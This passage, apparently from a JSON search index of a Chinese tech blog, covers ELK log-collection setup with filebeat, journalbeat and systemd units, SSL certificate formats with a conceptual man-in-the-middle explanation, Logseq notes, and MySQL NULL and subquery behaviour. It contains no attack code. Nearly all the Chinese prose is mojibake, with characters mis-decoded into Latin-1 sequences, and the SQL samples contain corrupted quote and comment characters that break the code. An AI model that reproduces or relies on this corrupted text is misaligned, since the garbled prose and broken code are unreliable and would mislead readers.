1111\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ==>  Preparing: select * from t_user where login_name=?\n2020-10-06 11:40:36.653 DEBUG http-bio-10009-exec-302 - ==> Parameters: 18888888888(String)\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-302 - Filtering response of path: /some/controller/path\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - Filtering request of path: /some/controller/path\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - init session with something=<null>,xxxxxxxx,userId=1234\n2020-10-06 11:40:37.254 INFO http-bio-10009-exec-308 - start someMethod for some params\n2020-10-06 11:40:37.255 INFO http-bio-10009-exec-308 - getUser for someField null,paramId 2222\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ==>  Preparing: select * from t_user where login_name=?\n2020-10-06 11:40:37.255 DEBUG http-bio-10009-exec-308 - ==> Parameters: 19999999999(String)\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - Filtering request of path: /some/controller/path\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - init session with something=<null>,xxxxxxxx,userId=1256\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-171 - Filtering response of path: /some/controller/path\n2020-10-06 11:40:37.262 INFO http-bio-10009-exec-308 - Filtering response of path: /another/controller/path\n2020-10-06 11:40:37.263 INFO http-bio-10009-exec-135 - Filtering request of path: /another/controller/path\n2020-10-06 11:40:37.263 INFO http-bio-10009-exec-135 - init session with something=<null>,xxxxxxxx,userId=5678\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ooo Using Connection [com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl@5f324b3c]\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ==>  Preparing: select a.* from sometable a where a.user_id = ?\n2020-10-06 11:40:37.277 DEBUG http-bio-10009-exec-135 - ==> Parameters: 5678(Long)\n2020-10-06 11:40:37.277 INFO http-bio-10009-exec-135 - Filtering response of path: /another/controller/path\n```\n\n\n\né…ç½®è¾“å…¥æº`vi filebeat.yml`\n\n```ini\n- type: log\n\n  # Change to true to enable this input configuration.\n  enabled: true\n\n  # Paths that should be crawled and fetched. Glob based paths.\n  paths:\n    - /opt/data/my-app1-log/*.log\n```\n\n\n\nå¯åŠ¨\n\n```bash\n./filebeat test config -e # æµ‹è¯•é…ç½®, å¦‚æœæ²¡æœ‰é—®é¢˜çš„è¯æœ€åä¼šè¾“å‡ºConfig OKå­—æ ·ã€‚\n\n./filebeat -e # å¯åŠ¨\n```\n\n\n\n### 1.4 å®‰è£… journalbeat\n\n```bash\ncurl -L -O https://artifacts.elastic.co/downloads/beats/journalbeat/journalbeat-7.10.2-linux-x86_64.tar.gz\ntar xzvf journalbeat-7.10.2-linux-x86_64.tar.gz\n\n\nsudo chown root journalbeat.yml \nsudo ./journalbeat -e\n```\n\n\n\njournalbeat.yml\n\n```bash\ninclude_matches:\n\t- _SYSTEMD_UNIT=lw-music.service\n```\n\n\n\n\n\n# 2. å±•ç¤ºæ•°æ®\n\n### 2.1 åˆ›å»ºç´¢å¼•æ¨¡å¼\n\næ‰“å¼€Kibanaé¡µé¢ï¼Œç‚¹å‡»èœå• Management > Stack Management > Index Patternsï¼Œç„¶åç‚¹å‡»é¡µé¢ä¸Šçš„Create index patternï¼Œåœ¨Index patternè¾“å…¥æ¡†ä¸­è¾“å…¥filebeat-*å…³é”®å­—ï¼Œå½“æç¤ºSuccess! Your index pattern matches 1 index.æ—¶ï¼Œæˆ‘ä»¬ç‚¹å‡»Next stepã€‚\n\n\n\nç„¶ååœ¨Time Filter field nameä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©@timestampä½œä¸ºæ—¶é—´è¿‡æ»¤å­—æ®µï¼Œæœ€åç‚¹å‡»Create index patternæŒ‰é’®ï¼Œç¨ç­‰å‡ ç§’ï¼Œå®Œæˆç´¢å¼•æ¨¡å¼åˆ›å»ºã€‚\n\n### 2.2 æŸ¥è¯¢\n\nç‚¹å‡»èœå• Kibana > Discover, è¿›å…¥æŸ¥è¯¢é¡µé¢ï¼Œå½“å‰é¡µé¢é»˜è®¤æŸ¥è¯¢è¿‡å»15åˆ†é’Ÿçš„æ—¥å¿—ï¼Œå¦‚æœä½ çš„é¡µé¢æ˜¾ç¤ºæ²¡æœ‰æŸ¥åˆ°ä»»ä½•ä¸œè¥¿ï¼Œè¯·è°ƒæ•´ä¸€ä¸‹æ—¶é—´æ®µï¼Œæ¯”å¦‚å°†æ—¶é—´æ”¹ä¸ºæŸ¥æ‰¾ä»Šå¤©ï¼Œç„¶åå°±èƒ½æŸ¥åˆ°å†…å®¹äº†.\n\n![image-20210120170134220](elk%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/image-20210120170134220.png) \n\n\n\n# 3. åˆ›å»ºæœåŠ¡\n\n### 3.1 elasticsearch\n\nsudo vi /lib/systemd/system/elasticsearch.service\n\n```bash\n[Unit]\nDescription=elasticsearch\nAfter=network.target\n[Service]\nType=simple\nUser=elasticsearch\nGroup=elasticsearch\nRestart=no\nExecStart=/home/elasticsearch/workspace/elasticsearch-7.10.1/bin/elasticsearch\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start elasticsearch\n\n### 3.2 kibana\n\nsudo vi /lib/systemd/system/kibana.service\n\n```\n[Unit]\nDescription=kibana\nAfter=network.target\n[Service]\nType=simple\nUser=elasticsearch\nGroup=elasticsearch\nRestart=no\nExecStart=/home/elasticsearch/workspace/kibana-7.10.1-linux-x86_64/bin/kibana\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start kibana\n\n\n\n### 3.3 journalbeat\n\nsudo vi /lib/systemd/system/journalbeat.service\n\n```\n[Unit]\nDescription=journalbeat\nAfter=network.target\n[Service]\nType=simple\nUser=root\nGroup=root\nRestart=no\nWorkingDirectory=/home/elasticsearch/workspace/journalbeat-7.10.2-linux-x86_64/\nExecStart=/home/elasticsearch/workspace/journalbeat-7.10.2-linux-x86_64/journalbeat\nPrivateTmp=true\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start journalbeat\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/cloud_xy/article/details/103228810\n+ https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html\n+ https://www.elastic.co/guide/cn/elasticsearch/guide/current/getting-started.html","tags":["elk"],"categories":["elk"]},{"title":"sslæ•°å­—è¯ä¹¦åç¼€","url":"%2Fp%2Ffe1a2c09.html","content":"\n# 0. æ¦‚å¿µ\n\n### 0.1 HTTPS é€šä¿¡è¿‡ç¨‹\n\n1. æµè§ˆå™¨å‘ç½‘ç«™æœåŠ¡å™¨è¯·æ±‚ï¼ŒæœåŠ¡å™¨æŠŠå…¬é’¥Aæ˜æ–‡ç»™ä¼ è¾“æµè§ˆå™¨ã€‚\n2. æµè§ˆå™¨éšæœºç”Ÿæˆä¸€ä¸ªç”¨äºå¯¹ç§°åŠ å¯†çš„å¯†é’¥Xï¼Œç”¨å…¬é’¥AåŠ å¯†åä¼ ç»™æœåŠ¡å™¨ã€‚\n3. æœåŠ¡å™¨æ‹¿åˆ°åç”¨ç§é’¥Aâ€™è§£å¯†å¾—åˆ°å¯†é’¥Xã€‚\n4. è¿™æ ·åŒæ–¹å°±éƒ½æ‹¥æœ‰å¯†é’¥Xäº†ï¼Œä¸”åˆ«äººæ— æ³•çŸ¥é“å®ƒã€‚ä¹‹ååŒæ–¹æ‰€æœ‰æ•°æ®éƒ½ç”¨å¯†é’¥X å¯¹ç§°åŠ å¯†è§£å¯†ã€‚\n\n<!-- more -->\n\n\n\n### 0.2 ä¸­é—´äººæ”»å‡»\n\n1. æµè§ˆå™¨å‘ç½‘ç«™æœåŠ¡å™¨è¯·æ±‚ï¼ŒæœåŠ¡å™¨æŠŠå…¬é’¥Aæ˜æ–‡ç»™ä¼ è¾“æµè§ˆå™¨ã€‚\n2. ä¸­é—´äººåŠ«æŒåˆ°å…¬é’¥Aï¼Œä¿å­˜ä¸‹æ¥ï¼ŒæŠŠæ•°æ®åŒ…ä¸­çš„å…¬é’¥Aæ›¿æ¢æˆè‡ªå·±ä¼ªé€ çš„å…¬é’¥Bï¼ˆå®ƒå½“ç„¶ä¹Ÿæ‹¥æœ‰å…¬é’¥Bå¯¹åº”çš„ç§é’¥Bâ€™ï¼‰ã€‚\n3. æµè§ˆå™¨éšæœºç”Ÿæˆä¸€ä¸ªç”¨äºå¯¹ç§°åŠ å¯†çš„å¯†é’¥Xï¼Œç”¨å…¬é’¥Bï¼ˆæµè§ˆå™¨ä¸çŸ¥é“å…¬é’¥è¢«æ›¿æ¢äº†ï¼‰åŠ å¯†åä¼ ç»™æœåŠ¡å™¨ã€‚\n4. ä¸­é—´äººåŠ«æŒåç”¨ç§é’¥Bâ€™è§£å¯†å¾—åˆ°å¯†é’¥Xï¼Œå†ç”¨å…¬é’¥AåŠ å¯†åä¼ ç»™æœåŠ¡å™¨ã€‚\n5. æœåŠ¡å™¨æ‹¿åˆ°åç”¨ç§é’¥Aâ€™è§£å¯†å¾—åˆ°å¯†é’¥Xã€‚\n\næ ¹æœ¬åŸå› æ˜¯æµè§ˆå™¨æ— æ³•ç¡®è®¤è‡ªå·±æ”¶åˆ°çš„å…¬é’¥æ˜¯ä¸æ˜¯ç½‘ç«™è‡ªå·±çš„ã€‚\n\n### 0.3 æ•°å­—è¯ä¹¦\n\nç½‘ç«™åœ¨ä½¿ç”¨HTTPSå‰ï¼Œéœ€è¦å‘â€œCAæœºæ„â€ç”³è¯·é¢å‘ä¸€ä»½æ•°å­—è¯ä¹¦ï¼Œæ•°å­—è¯ä¹¦é‡Œæœ‰è¯ä¹¦æŒæœ‰è€…ã€è¯ä¹¦æŒæœ‰è€…çš„å…¬é’¥ç­‰ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æŠŠè¯ä¹¦ä¼ è¾“ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨ä»è¯ä¹¦é‡Œå–å…¬é’¥å°±è¡Œäº†ï¼Œè¯ä¹¦å°±å¦‚èº«ä»½è¯ä¸€æ ·ï¼Œå¯ä»¥è¯æ˜â€œè¯¥å…¬é’¥å¯¹åº”è¯¥ç½‘ç«™â€ã€‚\n\n> å®é™…ä¸Šï¼Œæ•°å­—è¯ä¹¦å°±æ˜¯ç»è¿‡CAè®¤è¯è¿‡çš„å…¬é’¥ã€‚\n\n### 0.4 æ•°å­—ç­¾å\n\nå¦‚ä½•é˜²æ­¢æ•°å­—è¯ä¹¦è¢«ç¯¡æ”¹? æˆ‘ä»¬æŠŠè¯ä¹¦å†…å®¹ç”Ÿæˆä¸€ä»½â€œç­¾åâ€ï¼Œæ¯”å¯¹è¯ä¹¦å†…å®¹å’Œç­¾åæ˜¯å¦ä¸€è‡´å°±èƒ½å¯Ÿè§‰æ˜¯å¦è¢«ç¯¡æ”¹ã€‚è¿™ç§æŠ€æœ¯å°±å«æ•°å­—ç­¾å\n\n1. CAæ‹¥æœ‰éå¯¹ç§°åŠ å¯†çš„ç§é’¥å’Œå…¬é’¥ã€‚\n2. CAå¯¹è¯ä¹¦æ˜æ–‡ä¿¡æ¯è¿›è¡Œhashã€‚\n3. å¯¹hashåçš„å€¼ç”¨ç§é’¥åŠ å¯†ï¼Œå¾—åˆ°æ•°å­—ç­¾åã€‚\n\næµè§ˆå™¨éªŒè¯è¿‡ç¨‹ï¼š\n\n1. æ‹¿åˆ°è¯ä¹¦ï¼Œå¾—åˆ°æ˜æ–‡Tï¼Œæ•°å­—ç­¾åSã€‚\n2. ç”¨CAæœºæ„çš„å…¬é’¥å¯¹Sè§£å¯†ï¼ˆç”±äºæ˜¯æµè§ˆå™¨ä¿¡ä»»çš„æœºæ„ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¿æœ‰å®ƒçš„å…¬é’¥ã€‚ï¼‰ï¼Œå¾—åˆ°Sâ€™ã€‚\n3. ç”¨è¯ä¹¦é‡Œè¯´æ˜çš„hashç®—æ³•å¯¹æ˜æ–‡Tè¿›è¡Œhashå¾—åˆ°Tâ€™ã€‚\n4. æ¯”è¾ƒSâ€™æ˜¯å¦ç­‰äºTâ€™ï¼Œç­‰äºåˆ™è¡¨æ˜è¯ä¹¦å¯ä¿¡ã€‚\n\n\n\n# 1. PKCS\n\nPKCS å…¨ç§°æ˜¯ Public-Key Cryptography Standards ï¼Œæ˜¯ç”± RSA å®éªŒå®¤ä¸å…¶å®ƒå®‰å…¨ç³»ç»Ÿå¼€å‘å•†ä¸ºä¿ƒè¿›å…¬é’¥å¯†ç çš„å‘å±•è€Œåˆ¶è®¢çš„ä¸€ç³»åˆ—æ ‡å‡†ï¼ŒPKCS ç›®å‰å…±å‘å¸ƒè¿‡ 15 ä¸ªæ ‡å‡†ã€‚ \n\n### 1.1 PKCS#7 \n\nPKCS#7 cert request response: .p7r æ˜¯CAå¯¹è¯ä¹¦è¯·æ±‚çš„å›å¤ï¼Œåªç”¨äºå¯¼å…¥\nPKCS#7 binary message: .p7b ä»¥æ ‘çŠ¶å±•ç¤ºè¯ä¹¦é“¾(certificate chain)ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå•ä¸ªè¯ä¹¦ï¼Œä¸å«ç§é’¥\n\n### 1.2 PKCS#10 \n\nCertification Request: .p10 è¯ä¹¦è¯·æ±‚\n\n### 1.3 PKCS#12 \n\nPersonal Information Exchange: .pfx, .p12 ç”¨äºå­˜æ”¾ä¸ªäººè¯ä¹¦/ç§é’¥ï¼Œä»–é€šå¸¸åŒ…å«ä¿æŠ¤å¯†ç ï¼Œ2è¿›åˆ¶æ–¹å¼\n\n### 1.4 X.509\n\nX.509æ˜¯å¸¸è§é€šç”¨çš„è¯ä¹¦æ ¼å¼ã€‚æ‰€æœ‰çš„è¯ä¹¦éƒ½ç¬¦åˆä¸ºPublic Key Infrastructure (PKI) åˆ¶å®šçš„ ITU-T X509 å›½é™…æ ‡å‡†ã€‚\n\nX.509 der ç¼–ç (ASCII)çš„åç¼€æ˜¯ï¼š .DER .CER .CRT\n\nX.509 pem ç¼–ç (Base64)çš„åç¼€æ˜¯ï¼š .PEM .CER .CRT\n\n\n\n# 2. è¯ä¹¦åç¼€\n\n### 2.1 *.der è¯ä¹¦\n\næ‰©å±•åderç”¨äºäºŒè¿›åˆ¶DERç¼–ç çš„è¯ä¹¦ã€‚è¿™äº›è¯ä¹¦ä¹Ÿå¯ä»¥ç”¨ceræˆ–è€…crtä½œä¸ºæ‰©å±•åã€‚æ¯”è¾ƒåˆé€‚çš„è¯´æ³•æ˜¯â€œæˆ‘æœ‰ä¸€ä¸ªderç¼–ç çš„è¯ä¹¦â€ï¼Œè€Œä¸æ˜¯â€œæˆ‘æœ‰ä¸€ä¸ªderè¯ä¹¦â€ã€‚\n\nJavaå’ŒWindowsæœåŠ¡å™¨åå‘äºä½¿ç”¨è¿™ç§ç¼–ç æ ¼å¼ã€‚\n\n### 2.2 *.pem base64è¯ä¹¦æˆ–å¯†é’¥\n\nPrivacy Enhanced Mailï¼Œè¯ä¹¦æˆ–å¯†é’¥çš„Base64æ–‡æœ¬å­˜å‚¨æ ¼å¼ï¼Œå¯ä»¥å•ç‹¬å­˜æ”¾è¯ä¹¦æˆ–å¯†é’¥ï¼Œä¹Ÿå¯ä»¥åŒæ—¶å­˜æ”¾è¯ä¹¦æˆ–å¯†é’¥ã€‚\n\næ‰“å¼€çœ‹æ–‡æœ¬æ ¼å¼,ä»¥â€â€”â€“BEGINâ€¦â€å¼€å¤´, â€œâ€”â€“ENDâ€¦â€ç»“å°¾,å†…å®¹æ˜¯BASE64ç¼–ç ã€‚\n\nä¸€èˆ¬ Apache å’Œ Nginx æœåŠ¡å™¨åº”ç”¨åå‘äºä½¿ç”¨ PEM è¿™ç§ç¼–ç æ ¼å¼ã€‚\n\n### 2.3 *.cer *.crt äºŒè¿›åˆ¶è¯ä¹¦\n\n.cer/.crtæ˜¯ç”¨äºå­˜æ”¾è¯ä¹¦ï¼Œå®ƒæ˜¯2è¿›åˆ¶å½¢å¼å­˜æ”¾çš„ï¼Œä¸å«ç§é’¥ã€‚ \n\nè¯ä¹¦å¯ä»¥æ˜¯DERç¼–ç ï¼Œä¹Ÿå¯ä»¥æ˜¯PEMç¼–ç ã€‚\n\nwindowsä¸‹å«cerï¼Œlinuxä¸‹å«crtã€‚ \n\n### 2.4 pkcs1-pkcs12\n\nå…¬é’¥åŠ å¯†(éå¯¹ç§°åŠ å¯†)çš„ä¸€ç§æ ‡å‡†(Pbulic Key Cryptography Standards),ä¸€èˆ¬å­˜å‚¨ä¸º`*.pnï¼Œ*.p12`æ˜¯åŒ…å«è¯ä¹¦å’Œå¯†é’¥çš„å°è£…æ ¼å¼ã€‚\n\nPKCS å…¨ç§°æ˜¯ Public-Key Cryptography Standards ï¼Œæ˜¯ç”± RSA å®éªŒå®¤ä¸å…¶å®ƒå®‰å…¨ç³»ç»Ÿå¼€å‘å•†ä¸ºä¿ƒè¿›å…¬é’¥å¯†ç çš„å‘å±•è€Œåˆ¶è®¢çš„ä¸€ç³»åˆ—æ ‡å‡†ï¼ŒPKCS ç›®å‰å…±å‘å¸ƒè¿‡ 15 ä¸ªæ ‡å‡†ã€‚\n\n### 2.5 *.key\n\nå•ç‹¬å­˜æ”¾çš„pemæ ¼å¼çš„å¯†é’¥ï¼Œä¸€èˆ¬ä¿å­˜ä¸º*.keyã€‚\n\n### 2.6 *.csr\n\nè¯ä¹¦ç­¾åè¯·æ±‚(Certificate sign request)ï¼ŒåŒ…å«è¯ä¹¦æŒæœ‰äººçš„ä¿¡æ¯ï¼Œå¦‚å›½å®¶ï¼Œé‚®ä»¶ï¼ŒåŸŸåç­‰ã€‚\n\n### 2.7 *.pfx\n\nå¾®è½¯iisçš„å®ç°ã€‚ç”¨äºå­˜æ”¾ä¸ªäººè¯ä¹¦/ç§é’¥ï¼Œé€šå¸¸åŒ…å«ä¿æŠ¤å¯†ç ï¼Œ2è¿›åˆ¶æ–¹å¼\n\n### 2.8 *.jks\n\njksæ˜¯Javaå¯†é’¥åº“(KeyStore)æ¯”è¾ƒå¸¸è§çš„ä¸€ç§æ ¼å¼ã€‚ä¸€èˆ¬å¯ç”¨é€šè¿‡cer æˆ–è€…pem æ ¼å¼çš„è¯ä¹¦ä»¥åŠç§é’¥çš„è¿›è¡Œè½¬åŒ–ä¸ºjksæ ¼å¼ï¼Œæœ‰å¯†ç ä¿æŠ¤ã€‚æ‰€ä»¥å®ƒæ˜¯å¸¦æœ‰ç§é’¥çš„è¯ä¹¦æ–‡ä»¶ï¼Œä¸€èˆ¬ç”¨æˆ·tomcatç¯å¢ƒçš„å®‰è£…ã€‚\n\n### 2.9 *.crl\n\nè¯ä¹¦åŠé”€åˆ—è¡¨(Certificate Revocation List)ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™:\n\n+ https://www.codeleading.com/article/36513493623/\n","tags":["ssl"],"categories":["https"]},{"title":"logseqç¬”è®°çš„ä½¿ç”¨","url":"%2Fp%2F2b1e388d.html","content":"\n# 1. ä»‹ç»\n\nè¿™æ˜¯ä¸€æ¬¾ç”±å›½äººå¼€å‘çš„æ”¯æŒåŒå‘é“¾æ¥çš„å¤§çº²ç¬”è®°è½¯ä»¶ï¼Œå¦‚æœä½ å¯¹ Roam Research æœ‰æ‰€è€³é—»ï¼Œæƒ³æ‰¾ä¸€æ¬¾åŸºç¡€ç”¨æ³•å¤§å·®ä¸å·®çš„å¹³æ›¿ï¼ŒLogseq ä¼šæ˜¯ç›®å‰å¸‚é¢ä¸Šæœ€å¥½çš„é€‰æ‹©ä¹‹ä¸€ã€‚\n\nå®ƒç°åœ¨ Beta é˜¶æ®µçš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ç°åœ¨åŠä»¥åéƒ½å°†æ°¸ä¹…å…è´¹ï¼Œè¿™æ„å‘³ç€ä½“éªŒå®ƒæ— éœ€æˆæœ¬ã€‚å®ƒç§‰æ‰¿éšç§è‡³ä¸Šçš„ç†å¿µï¼Œä½ å¯ä»¥å®Œå…¨ç¦»çº¿ä½¿ç”¨å®ƒï¼Œæ‰€æœ‰æ–‡æ¡£å°†ä»¥ Markdown æ ¼å¼å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä»»ä½•ä¸€æ¬¾æ–‡æœ¬ç¼–è¾‘å™¨éƒ½å¯ä»¥æ‰“å¼€ã€‚\n\n<!-- more -->\n\n# 2. æ’ä»¶\n\n\n![1](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/1.jpg)\n![2](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/2.jpg)\n\n### 2.1 Tabsè®¾ç½®\n\n+ cmd+w å…³é—­\n+ ç³»ç»Ÿè®¾ç½®ï¼ŒæŠŠ close window ç»™æ”¹æ‰ã€‚\n\n\n\n# 3. ä¸»é¢˜\n![3](logseq%E7%AC%94%E8%AE%B0%E7%9A%84%E4%BD%BF%E7%94%A8/3.jpg)\n\n- Laurel theme åˆ†å—\n- Textbook theme å·¦å¯¹é½\n- Woz theme æŠ¤çœ¼\n","tags":["logseq"],"categories":["ç¬”è®°"]},{"title":"mysqlæŸ¥è¯¢çŸ¥è¯†","url":"%2Fp%2F899b978d.html","content":"\n# 1. å…³é”®è¯\n\n### 1.1 union å’Œ  union all åŒºåˆ«\n\nUNION removes duplicate records (where all columns in the results are the same)\n\nUNION ALL does not.\n\n<!-- more -->\n\n### 1.2 distinctçš„ç”¨æ³•\n\nè¯­æ³•:\n\n```sql\nSELECT DISTINCT column_name,column_name FROM table_name; -- å¯¹åé¢æ‰€æœ‰çš„åˆ—, å…±åŒèµ·æ•ˆæœ\n```\n\n**1.2.1 group by å’Œ distinct çš„åŒºåˆ«**\n\nGROUP BY lets you use aggregate functions, like AVG, MAX, MIN, SUM, and COUNT. \n\nOn the other hand DISTINCT just removes duplicates.\n\nå¦‚æœæƒ³è¾¾åˆ°åŒæ ·æ•ˆæœ, å¯ä»¥ç”¨distinct, å› ä¸ºæ›´å¿«ä¸€äº›.\n\n\n\n# 2. NULL\n\n### 2.1 is null å’Œ  is not null\n\nè¯­æ³•:\n\n```sql\nSELECT column_names FROM table_name WHERE column_name IS NULL;\nSELECT column_names FROM table_name WHERE column_name IS NOT NULL;\n```\n\n\n\nåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºå­—ç¬¦ä¸²?\n\n```sql\nSelect * From Table Where (col is null or col = '')\n```\n\n\n\n### 2.2 not in å’Œ null çš„ç»“åˆ\n\n> SQL uses three valued logic: true, false, and unknown. A comparison with null results in unknown, which is not true\n\nåˆ›å»ºè¡¨:\n\n```sql\nCREATE TABLE pony\n(\nid INT PRIMARY KEY,\nname VARCHAR(255)\n);\n\nINSERT INTO pony (id, name)\nVALUES\n(1, â€˜Twilight Sparkleâ€™),\n(2, â€˜Rainbow Dashâ€™),\n(3, â€˜Pinkie Pieâ€™),\n(4, â€˜Rarityâ€™),\n(5, â€˜Applejackâ€™);\n```\n\n\n\n**æ³¨æ„ NULL ä¸èƒ½ç›´æ¥ !=** \n\n```sql\nSELECT * FROM pony;\nâ€” 5 rows as expected\n\nSELECT * FROM pony WHERE id = NULL;\nâ€” 0 rows as expected\n\nSELECT * FROM pony WHERE id != NULL;\nâ€” 0 rows, slight wtf\n\nSELECT * FROM pony WHERE id IS NOT NULL;\nâ€” 5 rows as expected\n```\n\n\n\n**NULL still works intuitively when using WHERE IN:**\n\n```sql\nSELECT * FROM pony WHERE id IN (1, 2, NULL);\nâ€” 2 rows as expected\n\nâ€” equivalent statement:\n\nSELECT * FROM pony\nWHERE id = 1\nOR id = 2\nOR id = null;\n```\n\n\n\n**WHERE NOT IN is where things get tricky:**\n\n```sql\nSELECT * FROM pony\nWHERE id NOT IN (1, 2, NULL);\nâ€” 0 rows, major wtf\n\n\nSELECT * FROM pony\nWHERE id != 1\nAND id != 2\nAND id != NULL;\n```\n\nLike explained in the intro, id != NULL is always unknown, therefor the entire WHERE clause is always FALSE.\n\n\n\n\n\n# 3. å­æŸ¥è¯¢\n\nSQLå­æŸ¥è¯¢å¯ä»¥åˆ†ä¸ºç›¸å…³å­æŸ¥è¯¢å’Œéç›¸å…³å­æŸ¥è¯¢ä¸¤ç±»ã€‚\n\n### 3.1 éç›¸å…³å­æŸ¥è¯¢\n\néç›¸å…³å­æŸ¥è¯¢çš„æ‰§è¡Œä¸ä¾èµ–ä¸å¤–éƒ¨çš„æŸ¥è¯¢ã€‚éç›¸å…³å­æŸ¥è¯¢ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºï¼šè¿”å›å•å€¼çš„å­æŸ¥è¯¢å’Œè¿”å›ä¸€ä¸ªåˆ—è¡¨çš„å­æŸ¥è¯¢ã€‚\n\næ‰§è¡Œè¿‡ç¨‹ï¼š\nï¼ˆ1ï¼‰æ‰§è¡Œå­æŸ¥è¯¢ï¼Œå…¶ç»“æœä¸è¢«æ˜¾ç¤ºï¼Œè€Œæ˜¯ä¼ é€’ç»™å¤–éƒ¨æŸ¥è¯¢ï¼Œä½œä¸ºå¤–éƒ¨æŸ¥è¯¢çš„æ¡ä»¶ä½¿ç”¨ã€‚\nï¼ˆ2ï¼‰æ‰§è¡Œå¤–éƒ¨æŸ¥è¯¢ï¼Œå¹¶æ˜¾ç¤ºæ•´ä¸ªç»“æœã€‚ã€€ã€€\n\n**3.1.1 è¿”å›å•å€¼ï¼š**\næŸ¥è¯¢æ‰€æœ‰ä»·æ ¼é«˜äºå¹³å‡ä»·æ ¼çš„å›¾ä¹¦åï¼Œä½œè€…ï¼Œå‡ºç‰ˆç¤¾å’Œä»·æ ¼ã€‚\n\n```sql\nSElECT å›¾ä¹¦åï¼Œä½œè€…ï¼Œå‡ºç‰ˆç¤¾ï¼Œä»·æ ¼\n  FROM Books\n  WHERE ä»·æ ¼ >\n  (\n    SELECT AVG(ä»·æ ¼)\n    FROM Books\n  )\n```\n\n**3.1.2 è¿”å›å€¼åˆ—è¡¨:**\n\n```sql\næŸ¥è¯¢æ‰€æœ‰å€Ÿé˜…å›¾ä¹¦çš„è¯»è€…ä¿¡æ¯\nSElECT *\n  FROM Readers\n  WHERE è¯»è€…ç¼–å· IN\n  (\n    SELECT è¯»è€…ç¼–å·\n    FROM [Borrow History]\n  )\n```\n\n\n\n### 3.2 ç›¸å…³å­æŸ¥è¯¢\n\nç›¸å…³å­æŸ¥è¯¢çš„æ‰§è¡Œä¾èµ–äºå¤–éƒ¨æŸ¥è¯¢, ç›¸å…³å­æŸ¥è¯¢æ— æ³•ç‹¬ç«‹äºå¤–éƒ¨æŸ¥è¯¢è€Œå¾—åˆ°è§£å†³ã€‚\n\næ‰§è¡Œè¿‡ç¨‹ï¼š\nï¼ˆ1ï¼‰ä»å¤–å±‚æŸ¥è¯¢ä¸­å–å‡ºä¸€ä¸ªå…ƒç»„ï¼Œå°†å…ƒç»„ç›¸å…³åˆ—çš„å€¼ä¼ ç»™å†…å±‚æŸ¥è¯¢ã€‚\nï¼ˆ2ï¼‰æ‰§è¡Œå†…å±‚æŸ¥è¯¢ï¼Œå¾—åˆ°å­æŸ¥è¯¢æ“ä½œçš„å€¼ã€‚\nï¼ˆ3ï¼‰å¤–æŸ¥è¯¢æ ¹æ®å­æŸ¥è¯¢è¿”å›çš„ç»“æœæˆ–ç»“æœé›†å¾—åˆ°æ»¡è¶³æ¡ä»¶çš„è¡Œã€‚\nï¼ˆ4ï¼‰ç„¶åå¤–å±‚æŸ¥è¯¢å–å‡ºä¸‹ä¸€ä¸ªå…ƒç»„é‡å¤åšæ­¥éª¤1-3ï¼Œç›´åˆ°å¤–å±‚çš„å…ƒç»„å…¨éƒ¨å¤„ç†å®Œæ¯•ã€‚ ã€€ã€€\n\n\n\næŸ¥è¯¢Booksè¡¨ä¸­å¤§äºè¯¥ç±»å›¾ä¹¦ä»·æ ¼å¹³å‡å€¼çš„å›¾ä¹¦ä¿¡æ¯\n\n```sql\nSELECT å›¾ä¹¦åï¼Œä½œè€…ï¼Œå‡ºç‰ˆç¤¾ï¼Œä»·æ ¼ FROM Books As a\n  WHERE ä»·æ ¼ >\n  (\n    SELECT AVG(ä»·æ ¼)\n    FROM Books AS b\n    WHERE a.ç±»ç¼–å·=b.ç±»ç¼–å·\n  )\n```\n\n### 3.3 æ€»ç»“\n\néç›¸å…³å­æŸ¥è¯¢æ˜¯ç‹¬ç«‹äºå¤–éƒ¨æŸ¥è¯¢çš„å­æŸ¥è¯¢ï¼Œå­æŸ¥è¯¢æ€»å…±æ‰§è¡Œä¸€æ¬¡ï¼Œæ‰§è¡Œå®Œæ¯•åå°†å€¼ä¼ 